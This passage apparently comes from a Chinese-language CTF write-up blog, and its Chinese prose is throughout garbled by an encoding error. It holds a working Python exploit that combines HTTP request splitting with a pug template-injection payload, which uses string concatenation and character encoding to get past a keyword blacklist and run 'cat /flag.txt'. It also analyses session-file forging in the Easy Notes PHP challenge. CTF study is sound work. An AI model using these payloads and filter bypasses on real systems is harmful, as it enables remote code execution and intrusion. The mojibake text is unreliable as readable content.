é‡Œçš„è„šæœ¬(æˆ‘è‡ªå·±å†™ä¸å‡ºæ¥)ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> requests<br><br>payload = <span class="hljs-string">&#x27;&#x27;&#x27; HTTP/1.1</span><br><span class="hljs-string"></span><br><span class="hljs-string">POST /file_upload HTTP/1.1</span><br><span class="hljs-string">Content-Type: multipart/form-data; boundary=---------------------------41671423531508392532090664957</span><br><span class="hljs-string">Content-Length: 350</span><br><span class="hljs-string"></span><br><span class="hljs-string">-----------------------------41671423531508392532090664957</span><br><span class="hljs-string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.pug&quot;</span><br><span class="hljs-string">Content-Type: ../template</span><br><span class="hljs-string"></span><br><span class="hljs-string">-var x = eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(&#x27;child_&#x27;+&#x27;pro&#x27;+&#x27;cess&#x27;)[&#x27;ex&#x27;+&#x27;ecSync&#x27;](&#x27;cat /flag.txt&#x27;).toString()&quot;)</span><br><span class="hljs-string">-return x</span><br><span class="hljs-string">-----------------------------41671423531508392532090664957--</span><br><span class="hljs-string"></span><br><span class="hljs-string">GET /flag HTTP/1.1</span><br><span class="hljs-string">x:&#x27;&#x27;&#x27;</span><br>payload = payload.replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;\r\n&quot;</span>)<br>payload = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;0xff&#x27;</span> + <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(c))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>)) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> payload) <br><span class="hljs-built_in">print</span>(payload)<br>r = requests.get(<span class="hljs-string">&#x27;http://5e5020f0-cba3-4d9e-98ff-81274c42ce13.node3.buuoj.cn/core?q=&#x27;</span> + urllib.parse.quote(payload))<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><p>GET &#x2F;flagåªæ˜¯ä¸ºäº†é—­åˆHTTPè¯·æ±‚ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs awk">åŸå§‹è¯·æ±‚æ•°æ®å¦‚ä¸‹ï¼š<br>GET <span class="hljs-regexp">/ HTTP/</span><span class="hljs-number">1.1</span><br>Host: xxx.xxx.xxx<br><br>å½“æˆ‘ä»¬æ’å…¥æ•°æ®å:<br>GET <span class="hljs-regexp">/ HTTP/</span><span class="hljs-number">1.1</span><br><br>GET <span class="hljs-regexp">/upload_file HTTP/</span><span class="hljs-number">1.1</span><br>xxxxxxæ–‡ä»¶ä¸Šä¼ <br>xxxxxxæ–‡ä»¶ä¸Šä¼ <br><br>Host:xxxxxxxxxx<br><br>ä¸Šæ¬¡è¯·æ±‚åŒ…çš„Hostå‚æ•°å°±å•ç‹¬å‡ºæ¥äº†ã€‚ä¼šæŠ¥é”™ã€‚æ‰€ä»¥æˆ‘ä»¬å†æ„é€ ä¸€ä¸ªè¯·æ±‚æŠŠä»–é—­åˆ<br><br>GET <span class="hljs-regexp">/ HTTP/</span><span class="hljs-number">1.1</span><br><br>GET <span class="hljs-regexp">/upload_file HTTP/</span><span class="hljs-number">1.1</span><br>xxxxxxæ–‡ä»¶ä¸Šä¼ <br>xxxxxxæ–‡ä»¶ä¸Šä¼ <br><br>GET <span class="hljs-regexp">/flag HTTP/</span><span class="hljs-number">1.1</span><br>x:Host:xxxxxxxxxx<br>ä¸ºå•¥è¦åŠ è¿™ä¸ªx:æˆ‘ä¹Ÿä¸æ˜¯å¾ˆæ¸…æ¥šã€‚å› ä¸ºå¦‚æœä¸åŠ ç›´æ¥å°±ä»¥Host:xxxxé—­åˆäº†ï¼Œä½†ä¸åŠ è¿™ä¸œè¥¿è¿˜æ‰§è¡Œä¸äº†å‘½ä»¤ã€‚ã€‚ã€‚<br></code></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯æ€ä¹ˆæ‰§è¡Œå‘½ä»¤(pugæ¨¡æ¿è§„åˆ™ï¼Œæ„Ÿè§‰è¿™ä¸œè¥¿æœ‰ä¸€ç‚¹ç‚¹åƒyaml?)ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js">- <span class="hljs-keyword">var</span> x =<span class="hljs-number">1</span><br>- <span class="hljs-keyword">return</span> x<br><span class="hljs-comment">//è®¿é—®é¡µé¢ä¼šçœ‹åˆ°1</span><br></code></pre></td></tr></table></figure><p>æ‰€ä»¥å¯ä»¥é€šè¿‡ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">-<span class="hljs-keyword">var</span> x = <span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;glob&quot;</span>+<span class="hljs-string">&quot;al.proce&quot;</span>+<span class="hljs-string">&quot;ss.mainMo&quot;</span>+<span class="hljs-string">&quot;dule.re&quot;</span>+<span class="hljs-string">&quot;quire(&#x27;child_&#x27;+&#x27;pro&#x27;+&#x27;cess&#x27;)[&#x27;ex&#x27;+&#x27;ecSync&#x27;](&#x27;cat /flag.txt&#x27;).toString()&quot;</span>)<br>-<span class="hljs-keyword">return</span> x<br></code></pre></td></tr></table></figure><p>è¿™ç§æ‹¼æ¥æ¥ç»•è¿‡é»‘åå•ä»è€Œæ‰§è¡Œå‘½ä»¤</p><p>ç„¶åæ˜¯<code>payload</code>çš„è½¬æ¢ï¼Œé¦–å…ˆé»‘åå•é‡Œå‡ºäº†å…³é”®å­—è¿˜è¿‡æ»¤äº†å•åŒå¼•å·ï¼Œéœ€è¦ç¼–ç ç»•è¿‡:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">blacklist</span>(<span class="hljs-params">url</span>) &#123;<br>    <span class="hljs-keyword">var</span> evilwords = [<span class="hljs-string">&quot;global&quot;</span>, <span class="hljs-string">&quot;process&quot;</span>, <span class="hljs-string">&quot;mainModule&quot;</span>, <span class="hljs-string">&quot;require&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;child_process&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;!&quot;</span>];<br></code></pre></td></tr></table></figure><p>è„šæœ¬é‡Œç”¨çš„è¿™ç§ç¼–ç ç»•è¿‡ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;0xff&#x27;</span> + <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(c))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>)) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> payload)<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªç¼–ç æ–¹å¼æ²¡ææ‡‚ã€‚ã€‚</p><h2 id="HarekazeCTF2019-Easy-Notes"><a href="#HarekazeCTF2019-Easy-Notes" class="headerlink" title="[HarekazeCTF2019]Easy Notes"></a>[HarekazeCTF2019]Easy Notes</h2><p>æç¤º<code>admin</code>ç”¨æˆ·æ‰èƒ½<code>GetFlag</code>ï¼Œç„¶åå­˜åœ¨ä¸‹è½½æˆ‘ä»¬ä¸Šä¼ çš„<code>Notes</code>åŠŸèƒ½ï¼š</p><p>ä¸€å¼€å§‹ä»¥ä¸ºè¿™é‡Œå­˜åœ¨ä»»æ„æ–‡ä»¶ä¸‹è½½ï¼Œä½†å¹¶æ²¡æœ‰</p><p>æºç  ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//lib.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">redirect</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>&#123;<br>  <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: &#x27;</span> . <span class="hljs-variable">$path</span>);<br>  <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-comment">// utility functions</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">e</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>, ENT_QUOTES);<br>&#125;<br><br><span class="hljs-comment">// user-related functions</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">validate_user</span>(<span class="hljs-params"><span class="hljs-variable">$user</span></span>) </span>&#123;<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$user</span>)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\A[0-9A-Z_-]&#123;4,64&#125;\z/i&#x27;</span>, <span class="hljs-variable">$user</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_logged_in</span>(<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set_user</span>(<span class="hljs-params"><span class="hljs-variable">$user</span></span>) </span>&#123;<br>  <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>] = <span class="hljs-variable">$user</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_user</span>(<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_admin</span>(<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>] === <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-comment">// note-related functions</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_notes</span>(<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;notes&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;notes&#x27;</span>] = [];<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;notes&#x27;</span>];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add_note</span>(<span class="hljs-params"><span class="hljs-variable">$title</span>, <span class="hljs-variable">$body</span></span>) </span>&#123;<br>  <span class="hljs-variable">$notes</span> = <span class="hljs-title function_ invoke__">get_notes</span>();<br>  <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$notes</span>, [<br>    <span class="hljs-string">&#x27;title&#x27;</span> =&gt; <span class="hljs-variable">$title</span>,<br>    <span class="hljs-string">&#x27;body&#x27;</span> =&gt; <span class="hljs-variable">$body</span>,<br>    <span class="hljs-string">&#x27;id&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">hash</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>, <span class="hljs-title function_ invoke__">microtime</span>())<br>  ]);<br>  <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;notes&#x27;</span>] = <span class="hljs-variable">$notes</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">find_note</span>(<span class="hljs-params"><span class="hljs-variable">$notes</span>, <span class="hljs-variable">$id</span></span>) </span>&#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-variable">$index</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$index</span> &lt; <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$notes</span>); <span class="hljs-variable">$index</span>++) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$notes</span>[<span class="hljs-variable">$index</span>][<span class="hljs-string">&#x27;id&#x27;</span>] === <span class="hljs-variable">$id</span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable">$index</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delete_note</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>) </span>&#123;<br>  <span class="hljs-variable">$notes</span> = <span class="hljs-title function_ invoke__">get_notes</span>();<br>  <span class="hljs-variable">$index</span> = <span class="hljs-title function_ invoke__">find_note</span>(<span class="hljs-variable">$notes</span>, <span class="hljs-variable">$id</span>);<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$index</span> !== <span class="hljs-literal">FALSE</span>) &#123;<br>    <span class="hljs-title function_ invoke__">array_splice</span>(<span class="hljs-variable">$notes</span>, <span class="hljs-variable">$index</span>, <span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;notes&#x27;</span>] = <span class="hljs-variable">$notes</span>;<br>&#125;<br><span class="hljs-comment">//export.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;init.php&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_logged_in</span>()) &#123;<br>  <span class="hljs-title function_ invoke__">redirect</span>(<span class="hljs-string">&#x27;/easy-notes/?page=home&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$notes</span> = <span class="hljs-title function_ invoke__">get_notes</span>();<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;type&#x27;</span>]) || <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;type&#x27;</span>])) &#123;<br>  <span class="hljs-variable">$type</span> = <span class="hljs-string">&#x27;zip&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-variable">$type</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;type&#x27;</span>];<br>&#125;<br><br><span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">get_user</span>() . <span class="hljs-string">&#x27;-&#x27;</span> . <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">8</span>)) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$type</span>;<br><span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;..&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$filename</span>); <span class="hljs-comment">// avoid path traversal</span><br><span class="hljs-variable">$path</span> = TEMP_DIR . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$filename</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$type</span> === <span class="hljs-string">&#x27;tar&#x27;</span>) &#123;<br>  <span class="hljs-variable">$archive</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PharData</span>(<span class="hljs-variable">$path</span>);<br>  <span class="hljs-variable">$archive</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-comment">// use zip as default</span><br>  <span class="hljs-variable">$archive</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>();<br>  <span class="hljs-variable">$archive</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$path</span>, ZIPARCHIVE::<span class="hljs-variable constant_">CREATE</span> | <span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">OVERWRITE</span>);<br>&#125;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$index</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$index</span> &lt; <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$notes</span>); <span class="hljs-variable">$index</span>++) &#123;<br>  <span class="hljs-variable">$note</span> = <span class="hljs-variable">$notes</span>[<span class="hljs-variable">$index</span>];<br>  <span class="hljs-variable">$title</span> = <span class="hljs-variable">$note</span>[<span class="hljs-string">&#x27;title&#x27;</span>];<br>  <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^!-~]/&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-variable">$title</span>);<br>  <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;#[/\\?*.]#&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-variable">$title</span>); <span class="hljs-comment">// delete suspicious characters</span><br>  <span class="hljs-variable">$archive</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;<span class="hljs-subst">&#123;$index&#125;</span>_<span class="hljs-subst">&#123;$title&#125;</span>.json&quot;</span>, <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$note</span>));<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$type</span> === <span class="hljs-string">&#x27;tar&#x27;</span>) &#123;<br>  <span class="hljs-variable">$archive</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-variable">$archive</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>&#125;<br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Disposition: attachment; filename=&quot;&#x27;</span> . <span class="hljs-variable">$filename</span> . <span class="hljs-string">&#x27;&quot;;&#x27;</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Length: &#x27;</span> . <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$path</span>));<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: application/zip&#x27;</span>);<br><span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$path</span>);<br><span class="hljs-comment">//init.php</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib.php&#x27;</span>);<br><br><span class="hljs-title function_ invoke__">session_save_path</span>(TEMP_DIR);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_SESSION</span>);<br><span class="hljs-comment">//config.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;TEMP_DIR&#x27;</span>, <span class="hljs-string">&#x27;tmp/&#x27;</span>);<br><br></code></pre></td></tr></table></figure><p>ä»£ç ä¸éš¾ç†è§£ï¼Œä¸»è¦æ˜¯è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_admin</span>(<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>] === <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶å®å‰é¢ä¹Ÿåšè¿‡ä¸€äº›<code>SESSION</code>çš„é¢˜ï¼Œç°åœ¨ç¨å¾®æœ‰ç‚¹æ€è·¯ï¼š</p><blockquote><p>1.phpçš„sessioné»˜è®¤å­˜å‚¨æ–‡ä»¶åæ˜¯sess_+PHPSESSIDçš„å€¼</p><p>2.æŠ“åŒ…è·å¾—sessionå€¼ç”±æ­¤è·å¾—ç›¸åº”å­˜å‚¨æ–‡ä»¶ï¼Œç„¶ååˆ¤æ–­å¼•æ“ä¿®æ”¹ç›¸åº”æ–‡ä»¶</p></blockquote><p>ä½†è¿˜æ˜¯è€é—®é¢˜ï¼Œä¸‹è½½æ–‡ä»¶æŠ“åŒ…æ˜¯è¿™ä¸ªï¼Œæ²¡æ³•å®ç°ä»»æ„æ–‡ä»¶ä¸‹è½½ï¼š</p><p><img src="/img/SWPU2019Web32.png" alt="SWPU2019Web32"></p><p>ä¸‹è½½çš„æ–‡ä»¶åç±»ä¼¼è¿™ç§ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">get_user</span>() . <span class="hljs-string">&#x27;-&#x27;</span> . <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">8</span>)) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$type</span>;<br><span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;..&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$filename</span>); <span class="hljs-comment">// avoid path traversal</span><br></code></pre></td></tr></table></figure><p><img src="/img/SWPU2019Web33.png" alt="SWPU2019Web33"></p><p><code>user</code>è¿™ä¸œè¥¿æˆ‘ä»¬å¯ä»¥æ§åˆ¶ï¼Œå¯ä»¥è®¾ç½®æˆç±»ä¼¼<code>sess_</code>è¿™ç§ï¼Œä½†ä»–åé¢ç»™åŠ äº†ä¸ª<code>-</code>å’Œåå…­ä½åå…­è¿›åˆ¶çš„éšæœºå­—ç¬¦ä¸²ã€‚ã€‚<code>type</code>çš„è¯é€šè¿‡è®¾ç½®æˆ<code>.</code>ç„¶åè¢«æ›¿æ¢ä¸ºç©ºï¼Œè¿™æ—¶æˆ‘ä»¬ä¸‹è½½çš„æ–‡ä»¶å°±æ˜¯ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">sess_-éšæœºåå…­ä½åå…­è¿›åˆ¶<br></code></pre></td></tr></table></figure><p>ä¸€å¼€å§‹ä»¥ä¸º<code>session</code>æ–‡ä»¶ä¸èƒ½å¸¦æ¨ªçº¿ï¼Œåé¢æŸ¥äº†ä¸€ä¸‹ï¼Œåªè¦è¿™ç§æ ¼å¼éƒ½å¯ä»¥ï¼š</p><p>session æ–‡ä»¶ä»¥ <code>sess_</code> å¼€å¤´ï¼Œä¸”åªå«æœ‰ <code>a-z</code>ï¼Œ<code>A-Z</code>ï¼Œ<code>0-9</code>ï¼Œ<code>-</code>ã€‚</p><p>æ–‡ä»¶åè§£å†³äº†ï¼Œä¸è¿‡å‹ç¼©åŒ…ä¸­çš„æ•°æ®å¦‚ä½•å¤„ç†ä¹Ÿè¦è€ƒè™‘ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">for</span> (<span 